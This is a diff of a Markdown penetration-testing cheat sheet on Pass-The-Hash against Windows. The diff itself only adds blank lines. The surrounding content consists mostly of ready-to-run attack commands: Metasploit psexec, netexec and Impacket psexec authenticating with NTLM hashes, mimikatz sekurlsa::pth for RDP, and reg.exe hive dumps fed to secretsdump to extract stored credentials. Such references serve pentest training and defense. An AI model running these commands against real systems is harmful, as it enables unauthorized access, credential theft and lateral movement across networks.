@@ -3,6 +3,7 @@
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
 * Metasploit
+
   ```powershell
   use exploit/windows/smb/psexec
   set RHOST 10.2.0.3
@@ -14,15 +15,21 @@ The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since 
   run
   shell
   ```
+
 * netexec
+
   ```powershell
   nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
   ```
+
 * Impacket suite
+
   ```powershell
   proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
   ```
+
 * Windows RDP and mimikatz
+
   ```powershell
   sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
   sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
@@ -36,7 +43,6 @@ C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save
 $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
-
 
 ## References
 
